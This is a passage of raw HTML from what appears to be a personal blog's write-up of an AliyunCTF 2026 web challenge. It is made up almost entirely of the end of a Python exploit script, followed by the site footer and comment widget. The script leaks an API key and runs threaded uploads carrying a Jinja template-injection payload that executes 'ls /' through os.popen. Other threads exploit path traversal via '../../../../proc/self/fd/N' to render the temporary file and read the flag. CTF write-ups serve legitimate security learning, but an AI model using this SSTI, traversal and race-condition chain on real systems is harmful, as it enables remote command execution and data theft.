        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Leak request failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token comment"># Retry once</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/heartbeat"</span></span><span class="token punctuation">,</span>
                              data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
                                  <span class="token string">"text"</span><span class="token punctuation">:</span>
                                  payload<span class="token punctuation">,</span>
                                  <span class="token string">"client"</span><span class="token punctuation">:</span>
                                  <span class="token string">"Content-Type"</span><span class="token punctuation">,</span>
                                  <span class="token string">"token"</span><span class="token punctuation">:</span>
                                  <span class="token string-interpolation"><span class="token string">f"multipart/form-data; boundary=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>boundary<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
                              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                              timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Leak failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token comment"># print(r.text)</span>

    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'([a-f0-9]&#123;64&#125;)'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] API Key not found"</span><span class="token punctuation">)</span>
    <span class="token comment"># sys.exit(1)</span>
    <span class="token keyword">return</span> <span class="token boolean">None</span>  <span class="token comment"># For testing without key if needed</span>


<span class="token keyword">def</span> <span class="token function">upload_thread</span><span class="token punctuation">(</span>stop_event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Continuously upload large files to /heartbeat.</span>
    <span class="token comment"># The 'text' param is kept short to pass validation.</span>
    <span class="token comment"># We add a 'dummy' file field that is large enough to force Werkzeug to write to disk.</span>

    <span class="token comment"># Payload designed to execute command and reveal flag filename</span>
    ssti_payload <span class="token operator">=</span> <span class="token string">"&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls /').read()&#125;&#125;"</span>

    <span class="token comment"># Pad payload to ~1MB to ensure temporary file creation</span>
    padding <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># 2MB</span>
    full_content <span class="token operator">=</span> ssti_payload <span class="token operator">+</span> padding

    <span class="token keyword">while</span> <span class="token keyword">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment"># We use a file upload for the padding</span>
            files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'padding'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'p.txt'</span><span class="token punctuation">,</span> full_content<span class="token punctuation">,</span> <span class="token string">'text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
            <span class="token comment"># 'text' must be provided and short</span>
            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'text'</span><span class="token punctuation">:</span> <span class="token string">'keepalive'</span><span class="token punctuation">&#125;</span>

            <span class="token comment"># This request will take some time to upload and process</span>
            requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/heartbeat"</span></span><span class="token punctuation">,</span>
                          data<span class="token operator">=</span>data<span class="token punctuation">,</span>
                          files<span class="token operator">=</span>files<span class="token punctuation">,</span>
                          timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            <span class="token comment"># Ignore timeouts or errors, we just want to spam uploads</span>
            <span class="token keyword">pass</span>
        <span class="token comment"># time.sleep(0.01)</span>


<span class="token keyword">def</span> <span class="token function">read_thread</span><span class="token punctuation">(</span>api_key<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> fd_range<span class="token punctuation">)</span><span class="token punctuation">:</span>
    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Authorization"</span><span class="token punctuation">:</span> api_key<span class="token punctuation">&#125;</span>

    <span class="token keyword">while</span> <span class="token keyword">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> fd <span class="token keyword">in</span> fd_range<span class="token punctuation">:</span>
            <span class="token keyword">if</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">break</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token comment"># Include /proc/self/fd/X</span>
                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
                    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin"</span></span><span class="token punctuation">,</span>
                    params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"tmpl"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"../../../../proc/self/fd/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>fd<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                    headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>
                    timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

                <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
                    text <span class="token operator">=</span> r<span class="token punctuation">.</span>text
                    <span class="token comment"># Check for execution evidence (e.g., 'bin', 'etc', 'flag-')</span>
                    <span class="token keyword">if</span> <span class="token string">"bin"</span> <span class="token keyword">in</span> text <span class="token keyword">and</span> <span class="token string">"etc"</span> <span class="token keyword">in</span> text <span class="token keyword">and</span> <span class="token string">"flag-"</span> <span class="token keyword">in</span> text<span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[+] HIT! Found flag info in fd </span><span class="token interpolation"><span class="token punctuation">&#123;</span>fd<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                        <span class="token comment"># Extract flag filename from ls output</span>
                        m <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'(flag-[a-f0-9]+\.txt)'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>
                        <span class="token keyword">if</span> m<span class="token punctuation">:</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Flag Filename: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                            stop_event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

                            <span class="token comment"># Read the actual flag</span>
                            flag_r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
                                <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin"</span></span><span class="token punctuation">,</span>
                                params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"tmpl"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"../../../../</span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                                headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] FLAG CONTENT: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag_r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                            <span class="token keyword">return</span>
            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> leak_api_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> key<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Could not leak key, exiting."</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] API_KEY: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    stop_event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># Start uploader threads to keep temp files on disk</span>
    uploaders <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 4 upload threads</span>
        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>upload_thread<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>stop_event<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
        uploaders<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>

    <span class="token comment"># Start reader threads to scan FDs</span>
    readers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token comment"># Scan FDs 3 to 30 (Docker/Linux usually assigns low FDs)</span>
    <span class="token comment"># Split execution across threads</span>

    <span class="token comment"># Thread 1: 3-10</span>
    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_thread<span class="token punctuation">,</span>
                          args<span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># Thread 2: 11-20</span>
    t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_thread<span class="token punctuation">,</span>
                          args<span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># Thread 3: 21-30</span>
    t3 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_thread<span class="token punctuation">,</span>
                          args<span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># Thread 4: 7-8 (Focus on likely candidates strongly)</span>
    t4 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_thread<span class="token punctuation">,</span>
                          args<span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    readers<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t2<span class="token punctuation">,</span> t3<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> t <span class="token keyword">in</span> readers<span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Race condition started. Press Ctrl+C to stop..."</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token keyword">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] Stopping..."</span><span class="token punctuation">)</span>
        stop_event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> t <span class="token keyword">in</span> uploaders <span class="token operator">+</span> readers<span class="token punctuation">:</span>
        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Done."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2026/01/31/AliyunCTF2026/IMG-20260201165254381.png"></p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2026 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>